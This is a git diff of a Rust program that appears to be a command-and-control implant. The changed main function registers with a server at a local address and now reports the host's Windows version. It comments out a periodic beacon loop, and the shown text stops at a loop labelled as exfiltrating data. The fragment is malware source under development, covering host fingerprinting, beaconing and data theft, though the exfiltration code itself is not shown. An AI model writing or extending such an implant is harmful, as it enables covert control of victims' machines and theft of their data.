@@ -1,5 +1,7 @@
 mod server;
+mod system;
 use std::{sync::Arc};
+use system::get_windows_version;
 use tokio::time::{Duration, sleep};
 
 
@@ -19,19 +21,22 @@ macro_rules! unwrap_or_panic {
 async fn main() {
     const URL: &'static str  = "http://127.0.0.1:5000";
 
+    
     let server = Arc::new(server::Connection::new(&URL));
 
-    let id: String = unwrap_or_panic!(server.register("HI").await);
+    let arch = get_windows_version();
 
-    let server_clone = Arc::clone(&server);
-    let id_clone = id.clone();
+    let id: String = unwrap_or_panic!(server.register(arch).await);
 
-    tokio::spawn(async move {
-        loop {
-            server_clone.becon(&id_clone).await;
-            sleep(Duration::from_secs(10)); 
-        }
-    });
+    // let server_clone = Arc::clone(&server);
+    // let id_clone = id.clone();
+
+    // tokio::spawn(async move {
+    //     loop {
+    //         server_clone.becon(&id_clone).await;
+    //         sleep(Duration::from_secs(1000)); 
+    //     }
+    // });
 
     loop{
         //exfiltrates data
